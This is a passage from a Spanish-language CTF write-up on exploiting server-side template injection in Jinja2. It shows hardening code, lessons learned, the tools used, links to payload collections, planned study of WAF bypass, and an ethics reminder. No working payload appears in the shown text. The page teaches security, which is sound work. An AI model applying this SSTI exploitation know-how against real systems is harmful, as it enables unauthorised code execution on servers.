+</span></span><span class="line"><span class="cl"><span class="c1"># Pasar solo variables específicas necesarias</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;user_name&#39;</span><span class="p">:</span> <span class="n">sanitized_name</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="n">template</span><span class="o">.</span><span class="n">render</span><span class="p">(</span><span class="n">context</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 5. Principio de menor privilegio</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># No ejecutar la aplicación como root</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Usar contenedores con permisos restringidos</span>
+</span></span></code></pre></div><h3 id="-configuración-segura-en-producción">
+  🔒 Configuración Segura en Producción
+  <a class="heading-link" href="#-configuraci%c3%b3n-segura-en-producci%c3%b3n">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Enlace al encabezado"></i>
+    <span class="sr-only">Enlace al encabezado</span>
+  </a>
+</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Configuración segura de Flask + Jinja2</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">jinja2</span> <span class="kn">import</span> <span class="n">Environment</span><span class="p">,</span> <span class="n">select_autoescape</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">jinja2.sandbox</span> <span class="kn">import</span> <span class="n">SandboxedEnvironment</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Entorno sandboxed</span>
+</span></span><span class="line"><span class="cl"><span class="n">env</span> <span class="o">=</span> <span class="n">SandboxedEnvironment</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="n">autoescape</span><span class="o">=</span><span class="n">select_autoescape</span><span class="p">([</span><span class="s1">&#39;html&#39;</span><span class="p">,</span> <span class="s1">&#39;xml&#39;</span><span class="p">]),</span>
+</span></span><span class="line"><span class="cl">    <span class="n">finalize</span><span class="o">=</span><span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">x</span> <span class="k">if</span> <span class="n">x</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span> <span class="k">else</span> <span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Configuración de Flask</span>
+</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="o">.</span><span class="n">update</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="n">SECRET_KEY</span><span class="o">=</span><span class="s1">&#39;your-secret-key&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">TEMPLATES_AUTO_RELOAD</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span>  <span class="c1"># En producción</span>
+</span></span><span class="line"><span class="cl">    <span class="n">SEND_FILE_MAX_AGE_DEFAULT</span><span class="o">=</span><span class="mi">31536000</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Headers de seguridad</span>
+</span></span><span class="line"><span class="cl"><span class="nd">@app.after_request</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">after_request</span><span class="p">(</span><span class="n">response</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">response</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s1">&#39;X-Content-Type-Options&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;nosniff&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">response</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s1">&#39;X-Frame-Options&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;DENY&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">response</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s1">&#39;X-XSS-Protection&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;1; mode=block&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">response</span>
+</span></span></code></pre></div><h2 id="-lecciones-aprendidas">
+  🎯 Lecciones Aprendidas
+  <a class="heading-link" href="#-lecciones-aprendidas">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Enlace al encabezado"></i>
+    <span class="sr-only">Enlace al encabezado</span>
+  </a>
+</h2>
+
+
+
+
+<div class="highlight-box techsec">
+  
+    <h3>1. La Investigación es Clave</h3>
+  
+  <div class="highlight-content">
+    Dedicar tiempo a entender la vulnerabilidad antes de explotar ahorra horas de trial-and-error. La documentación de
+PortSwigger fue invaluable.
+  </div>
+</div>
+
+
+
+
+
+<div class="highlight-box techsec">
+  
+    <h3>2. Metodología Sistemática</h3>
+  
+  <div class="highlight-content">
+    Seguir un proceso estructurado: identificar → confirmar → explorar → explotar. Cada paso construye sobre el anterior.
+  </div>
+</div>
+
+
+
+
+
+<div class="highlight-box techsec">
+  
+    <h3>3. Entender el Contexto</h3>
+  
+  <div class="highlight-content">
+    No solo encontrar la vulnerabilidad, sino entender por qué existe y cómo funciona a nivel técnico. Esto ayuda en la defensa.
+  </div>
+</div>
+
+
+
+
+
+<div class="highlight-box techsec">
+  
+    <h3>4. Documentar Todo</h3>
+  
+  <div class="highlight-content">
+    Cada payload, cada resultado, cada hipótesis. La documentación detallada es clave para el aprendizaje y la reproducibilidad.
+  </div>
+</div>
+
+
+
+
+
+<div class="highlight-box techsec">
+  
+    <h3>5. Pensar Como Defensor</h3>
+  
+  <div class="highlight-content">
+    Cada vulnerabilidad encontrada debe ir acompañada de conocimiento sobre cómo mitigarla. Attack y defense van de la mano.
+  </div>
+</div>
+
+<h2 id="-reflexión-personal">
+  🚴‍♂️ Reflexión Personal
+  <a class="heading-link" href="#-reflexi%c3%b3n-personal">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Enlace al encabezado"></i>
+    <span class="sr-only">Enlace al encabezado</span>
+  </a>
+</h2>
+
+
+<div class="section-rutas">
+  <p>Resolver este CTF fue como completar una subida difícil en bicicleta. Al principio, la pendiente (la vulnerabilidad)
+parecía imposible de superar. Pero paso a paso, pedaleada a pedaleada (payload a payload), fui progresando hasta llegar
+a la cima (el flag).</p>
+<p>Esta experiencia me enseñó que en cybersecurity, como en ciclismo, la persistencia metodológica es más valiosa que la
+velocidad pura. No se trata de ser el más rápido ejecutando payloads, sino de entender profundamente cada paso del proceso.</p>
+<p>El momento más satisfactorio no fue obtener el flag, sino ese &ldquo;click&rdquo; mental cuando entendí cómo Jinja2 procesa los
+objetos y cómo podía navegar por la estructura de Python para llegar al módulo <code>os</code>. Ese entendimiento profundo es lo
+que me permitirá reconocer y explotar SSTI en futuros desafíos.</p>
+
+</div>
+
+<h2 id="-estadísticas-del-reto">
+  📊 Estadísticas del Reto
+  <a class="heading-link" href="#-estad%c3%adsticas-del-reto">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Enlace al encabezado"></i>
+    <span class="sr-only">Enlace al encabezado</span>
+  </a>
+</h2>
+<ul>
+<li><strong>⏱️ Tiempo total</strong>: 3 horas</li>
+<li><strong>🔍 Tiempo de investigación</strong>: 1 hora</li>
+<li><strong>🧪 Tiempo de testing</strong>: 1.5 horas</li>
+<li><strong>📝 Tiempo de documentación</strong>: 30 minutos</li>
+<li><strong>🎯 Payloads probados</strong>: ~15</li>
+<li><strong>✅ Payloads exitosos</strong>: 4</li>
+<li><strong>📚 Recursos consultados</strong>: 5 fuentes principales</li>
+</ul>
+<h2 id="-herramientas-utilizadas">
+  🔧 Herramientas Utilizadas
+  <a class="heading-link" href="#-herramientas-utilizadas">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Enlace al encabezado"></i>
+    <span class="sr-only">Enlace al encabezado</span>
+  </a>
+</h2>
+<h3 id="principales">
+  Principales
+  <a class="heading-link" href="#principales">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Enlace al encabezado"></i>
+    <span class="sr-only">Enlace al encabezado</span>
+  </a>
+</h3>
+<ul>
+<li><strong>Firefox Developer Tools</strong>: Análisis de requests/responses</li>
+<li><strong>Burp Suite Community</strong>: Interceptar y modificar payloads</li>
+<li><strong>Terminal</strong>: Testing de comandos para verificar sintaxis</li>
+</ul>
+<h3 id="recursos-de-investigación">
+  Recursos de Investigación
+  <a class="heading-link" href="#recursos-de-investigaci%c3%b3n">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Enlace al encabezado"></i>
+    <span class="sr-only">Enlace al encabezado</span>
+  </a>
+</h3>
+<ul>
+<li><strong>PortSwigger Web Security Academy</strong>: Teoría y methodology</li>
+<li><strong>PayloadsAllTheThings</strong>: Repositorio de payloads</li>
+<li><strong>HackTricks</strong>: Técnicas específicas de SSTI</li>
+<li><strong>Jinja2 Documentation</strong>: Entender el template engine</li>
+</ul>
+<h2 id="-recursos-para-profundizar">
+  📚 Recursos para Profundizar
+  <a class="heading-link" href="#-recursos-para-profundizar">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Enlace al encabezado"></i>
+    <span class="sr-only">Enlace al encabezado</span>
+  </a>
+</h2>
+<h3 id="documentación-oficial">
+  Documentación Oficial
+  <a class="heading-link" href="#documentaci%c3%b3n-oficial">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Enlace al encabezado"></i>
+    <span class="sr-only">Enlace al encabezado</span>
+  </a>
+</h3>
+<ul>
+<li><strong><a href="https://portswigger.net/web-security/server-side-template-injection"  class="external-link" target="_blank" rel="noopener">PortSwigger SSTI Guide</a></strong> - La guía más completa</li>
+<li><strong><a href="https://jinja.palletsprojects.com/"  class="external-link" target="_blank" rel="noopener">Jinja2 Documentation</a></strong> - Documentación oficial del template engine</li>
+<li><strong><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server_Side_Template_Injection"  class="external-link" target="_blank" rel="noopener">OWASP SSTI</a></strong> - Testing guide oficial</li>
+</ul>
+<h3 id="recursos-prácticos">
+  Recursos Prácticos
+  <a class="heading-link" href="#recursos-pr%c3%a1cticos">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Enlace al encabezado"></i>
+    <span class="sr-only">Enlace al encabezado</span>
+  </a>
+</h3>
+<ul>
+<li><strong><a href="https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/"  class="external-link" target="_blank" rel="noopener">PayloadsAllTheThings - SSTI</a></strong> - Colección de payloads</li>
+<li><strong><a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection"  class="external-link" target="_blank" rel="noopener">HackTricks SSTI</a></strong> - Técnicas avanzadas</li>
+<li><strong><a href="https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/template-engines-special-vars"  class="external-link" target="_blank" rel="noopener">SecLists SSTI</a></strong> - Wordlists para fuzzing</li>
+</ul>
+<h3 id="labs-para-practicar">
+  Labs para Practicar
+  <a class="heading-link" href="#labs-para-practicar">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Enlace al encabezado"></i>
+    <span class="sr-only">Enlace al encabezado</span>
+  </a>
+</h3>
+<ul>
+<li><strong><a href="https://portswigger.net/web-security/server-side-template-injection"  class="external-link" target="_blank" rel="noopener">PortSwigger Web Security Academy</a></strong> - Labs gratuitos</li>
+<li><strong><a href="https://tryhackme.com/room/learnssti"  class="external-link" target="_blank" rel="noopener">TryHackMe SSTI Room</a></strong> - Práctica guiada</li>
+<li><strong><a href="https://www.vulnhub.com/"  class="external-link" target="_blank" rel="noopener">VulnHub SSTI VMs</a></strong> - Máquinas vulnerables</li>
+</ul>
+<h3 id="libros-recomendados">
+  Libros Recomendados
+  <a class="heading-link" href="#libros-recomendados">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Enlace al encabezado"></i>
+    <span class="sr-only">Enlace al encabezado</span>
+  </a>
+</h3>
+<ul>
+<li><strong>&ldquo;The Web Application Hacker&rsquo;s Handbook&rdquo;</strong> - Capítulo sobre template injection</li>
+<li><strong>&ldquo;Black Hat Python&rdquo;</strong> - Para entender mejor la explotación en Python</li>
+</ul>
+<h2 id="-próximos-pasos-en-mi-learning-path">
+  🔄 Próximos Pasos en Mi Learning Path
+  <a class="heading-link" href="#-pr%c3%b3ximos-pasos-en-mi-learning-path">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Enlace al encabezado"></i>
+    <span class="sr-only">Enlace al encabezado</span>
+  </a>
+</h2>
+<h3 id="challenges-inmediatos">
+  Challenges Inmediatos
+  <a class="heading-link" href="#challenges-inmediatos">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Enlace al encabezado"></i>
+    <span class="sr-only">Enlace al encabezado</span>
+  </a>
+</h3>
+<ul>
+<li><input disabled="" type="checkbox"> <strong>SSTI2 PicoCTF</strong> - El siguiente nivel de este tipo de desafío</li>
+<li><input disabled="" type="checkbox"> <strong>Template injection en Twig</strong> - PHP template engine</li>
+<li><input disabled="" type="checkbox"> <strong>SSTI en contextos blind</strong> - Sin output visible</li>
+<li><input disabled="" type="checkbox"> <strong>Bypass de filtros WAF</strong> - Evasión de protecciones</li>
+</ul>
+<h3 id="proyectos-de-desarrollo">
+  Proyectos de Desarrollo
+  <a class="heading-link" href="#proyectos-de-desarrollo">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Enlace al encabezado"></i>
+    <span class="sr-only">Enlace al encabezado</span>
+  </a>
+</h3>
+<ul>
+<li><input disabled="" type="checkbox"> <strong>Scanner SSTI personalizado</strong> - Herramienta de detección automática</li>
+<li><input disabled="" type="checkbox"> <strong>Wordlist de payloads</strong> - Colección propia basada en experiencia</li>
+<li><input disabled="" type="checkbox"> <strong>Lab personal SSTI</strong> - Entorno controlado para testing</li>
+</ul>
+<h3 id="habilidades-complementarias">
+  Habilidades Complementarias
+  <a class="heading-link" href="#habilidades-complementarias">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Enlace al encabezado"></i>
+    <span class="sr-only">Enlace al encabezado</span>
+  </a>
+</h3>
+<ul>
+<li><input disabled="" type="checkbox"> <strong>Python object introspection</strong> - Navegar estructuras de objetos</li>
+<li><input disabled="" type="checkbox"> <strong>Flask/Django internals</strong> - Entender frameworks web Python</li>
+<li><input disabled="" type="checkbox"> <strong>Sandboxing techniques</strong> - Métodos de containment</li>
+</ul>
+<h2 id="-conectemos-y-compartamos-conocimiento">
+  🤝 Conectemos y Compartamos Conocimiento
+  <a class="heading-link" href="#-conectemos-y-compartamos-conocimiento">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Enlace al encabezado"></i>
+    <span class="sr-only">Enlace al encabezado</span>
+  </a>
+</h2>
+<p><strong>¿Has trabajado con SSTI antes?</strong> Comparte tu experiencia en los comentarios.
+<strong>¿Tienes dudas sobre algún paso?</strong> No dudes en contactarme:</p>
+<ul>
+<li><strong>📧 Email</strong>: <a href="mailto:emilinho.sec@protonmail.com" >emilinho.sec@protonmail.com</a></li>
+<li><strong>🐦 Twitter</strong>: <a href="https://twitter.com/emilinho_sec"  class="external-link" target="_blank" rel="noopener">@emilinho_sec</a></li>
+<li><strong>💼 LinkedIn</strong>: <a href="https://linkedin.com/in/emilio-security"  class="external-link" target="_blank" rel="noopener">Emilio Security</a></li>
+<li><strong>🔗 GitHub</strong>: <a href="https://github.com/emilinho"  class="external-link" target="_blank" rel="noopener">github.com/emilinho</a></li>
+</ul>
+<p><strong>¿Encontraste otros vectores en este reto?</strong> ¡Me encantaría conocerlos y aprender de tu enfoque!</p>
+<h2 id="-serie-ctf-writeups">
+  🌟 Serie CTF Writeups
+  <a class="heading-link" href="#-serie-ctf-writeups">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Enlace al encabezado"></i>
+    <span class="sr-only">Enlace al encabezado</span>
+  </a>
+</h2>
+<p>Este writeup es parte de mi serie completa de CTF writeups. Otros posts relacionados:</p>
+<h3 id="-writeups-publicados">
+  📝 Writeups Publicados
+  <a class="heading-link" href="#-writeups-publicados">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Enlace al encabezado"></i>
+    <span class="sr-only">Enlace al encabezado</span>
+  </a>
+</h3>
+<ul>
+<li><strong><a href="../buffer-overflow-basics/" >Buffer Overflow Básico: Cuando la Memoria se Desborda</a></strong> - Próximamente</li>
+<li><strong><a href="../sqli-to-shell/" >SQL Injection: Del Error al Shell</a></strong> - En desarrollo</li>
+</ul>
+<h3 id="-próximos-writeups-planeados">
+  🎯 Próximos Writeups Planeados
+  <a class="heading-link" href="#-pr%c3%b3ximos-writeups-planeados">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Enlace al encabezado"></i>
+    <span class="sr-only">Enlace al encabezado</span>
+  </a>
+</h3>
+<ul>
+<li><strong>SSTI Advanced: Bypass Techniques</strong> - Técnicas de evasión</li>
+<li><strong>XSS to Account Takeover</strong> - Escalación de XSS</li>
+<li><strong>JWT Attacks in Practice</strong> - Vulnerabilidades en tokens</li>
+</ul>
+<hr>
+
+
+<div class="section-techsec">
+  <h2 id="-recordatorio-ético">
+  🔐 Recordatorio Ético
+  <a class="heading-link" href="#-recordatorio-%c3%a9tico">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Enlace al encabezado"></i>
+    <span class="sr-only">Enlace al encabezado</span>
+  </a>
+</h2>
+<p>Este conocimiento debe usarse únicamente para:</p>
+<ul>
+<li><strong>🎓 Propósitos educativos</strong>: Aprender y enseñar ciberseguridad</li>
+<li><strong>🧪 Testing autorizado</strong>: Penetration testing con permiso explícito</li>
+<li><strong>🛡️ Defensive security</strong>: Mejorar las defensas de sistemas propios</li>
+<li><strong>🏆 CTF competitions</strong>: Competencias éticas de hacking</li>
+</ul>
+<p><strong>Nunca uses estas técnicas en sistemas que no te pertenecen sin autorización explícita.</strong></p>
+<p>La diferencia entre un ethical hacker y un criminal es el consentimiento y la intención. Mantengamos nuestra comunidad
+ética y profesional.</p>
+
+</div>
+
+<hr>
+<p><em>&ldquo;Every vulnerability is a lesson in both attack and defense. Today I learned about SSTI, tomorrow I&rsquo;ll help someone
+defend against it.&rdquo;</em> - <strong>Emilinho</strong></p>
+<p><em>&ldquo;La verdadera maestría en ciberseguridad no está en encontrar vulnerabilidades, sino en entender por qué existen y
+cómo prevenirlas.&rdquo;</em> - <strong>Emilinho</strong></p>
+
+      </div>
+
+
+      <footer>
+        
+
+
+        
+        
+        
+        
+        
+
+        
+        
+      </footer>
+    </article>
+
+    
+  </section>
+
+    </div>
+
+    <footer class="footer">
+  <section class="container">
+    ©
+    
+      2019 -
+    
+    2025
+     Emilio Juárez 
+    ·
+    
+    Desarrollado por <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
+    
+  </section>
+</footer>
+
+  </main>
+
+  
+
+  
+  
+  <script src="/js/coder.js"></script>
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</body>
+
+</html>
